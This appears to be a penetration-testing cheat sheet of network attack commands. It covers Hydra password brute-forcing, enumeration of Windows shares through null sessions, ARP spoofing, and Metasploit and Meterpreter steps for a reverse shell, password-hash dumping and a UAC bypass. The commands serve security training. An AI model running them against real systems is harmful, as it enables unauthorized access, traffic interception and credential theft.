# Network Attacks 

### Seclists

[SecLists](https://github.com/danielmiessler/SecLists) is a great list containing common usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and more.

```
apt-get install seclists
```

### Hydra

Hydra is a fast, parallelized, network authentication cracker that supports different protocols.
```
hydra -L <users file> -P <password file> -t 10 <target> ssh -s 22
hydra -L <users file> -P <password file> telnet://<target>
```

### Windows Shares

NetBIOS can supply some of the following information when querying a computer:

- Hostname
- NetBIOS name
- Domain
- Network Shares

Badly configured shares exploitation can lead to:

- Information disclosure
- Unauthorized file access
- Information leakage used to mount a target attack

Null session attacks can be used to enumerate a lot of information. Attackers can steal information about:

- Passwords
- System users
- System Groups
- Running system processes
```
# Most common windows command to enumerate Windows shares
nbtstat -A <target>
```

```
# Once an attacker knows that a machine has the File Server service running, they can enumerate the shares using NET VIEW
NET VIEW <target>

# This tells Windows to connect to the IPC$ share by using an empty password and empty username
NET USE \\<target IP address>\IPC$ "" /u:''
```

```
# These commands can be used on a linux machine to enumerate network shares
nmblookup -A <target>

# Smbclient can do the same as NET VIEW but it also displays administrative shares that are hidden when using Windows standard tools
smbclient -L //<target> -N (list shares without asking for password)
smbclient //<target>/share -N (mount share)

# enum4linux is very powerful PERL script that can be used to enumerate Windows shares
enum4linux -a <target>
```
By default enum4linux performs:

- User enumeration
- Share enumeration
- Group and member enumeration
- Password policy extraction
- OS information detection
- A nmblookup run
- Printer information extraction

### ARP Poisoning/Spoofing (Dsniff)

ARP Poisoning is a powerful attack you can use to intercept traffic on a switched network.

```
# tells my machine to forward packets intercepted to the real destination hosts
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof -i <interface> -t <target> -r <host>
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11

# Example: to intercept traffic between 192.168.1.5 and 192.168.1.6 
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.5 -r 192.168.1.6
# Then run Wireshark and intercept the traffic
```

### Metasploit

Metasploit is an open-source framework used for penetration testing and exploit development.

Metasploit gives you a wide array of commuunity contributed exploits and attack vectors that can be used against various systems and technoologies.

Basic workflow to exploit a target using MSFConsole:

- Identifying a vulnerable service
- Searching for a proper exploit for that service
- Loading and configuring the exploit
- Loading and configuring the payload you want to use
- Running the exploit code and getting access to the vulnerable machine

```
# Starts up metasploit console
msfconsole

# Search all modules by term
search <search term>

# Setting which module to use
use /path/to/exploit

# Once a module is being used to show all options to configure
show options

# Use set command and name of setting to configure all settings
set payload /path/to/payload
set RHOST <remote host>
set RPORT <remote port>

# To run/exploit module
run
exploit
```

Payloads are pieces of code injected by an exploit module into the victim machine or service.

A payload is used by an attacker to get:

- An OS Shell
- A VNC or RDP connection
- A Meterpreter shell
- The execution of an attacker-supplied application

### Meterpreter

Meterpreter is a very powerful shell which runs on Android, BSD, Java, Linux, PHP, Python, and Windows vulnerable applications and services.

Meterpreter is more than a simple shell. It provides advanced features to gather information, transfer files between the attacker and victim machines, install backdoors and more.

Meterpreter lets you perform information gathering on the exploited machine and the network it is attached to. You can retrieve:

- Information about the machine and the OS
- The network configuration in use
- The routing table of the compromised host
- Information about the user running the exploited process

```
# You can set your payload to be a meterpreter shell before running it
set payload <windows, linux, java etc>/meterpreter/reverse_tcp

# Once you have a meterpreter session open you can background it or use Ctrl+z
background

# Use the sessions command to see all current running sessions
sessions
sessions -l

# Use the -i flag and the sessions number to interact with it
sessions -i 1

# Useful information gathering commands once in meterpreter shell
sysinfo
ifconfig
route
getuid
getsystem

# The hashdump module dumps the password database of a Windows machine
use post/windows/gather/hashdump
set session 1
run

# bypassuac is a module you can use to bypass uac control on a windows machine
use exploit/windows/local/bypassuac
show options
set session 1
exploit
getuid (now having administrative privileges)

# The shell command gives you a standard OS shell
shell
```
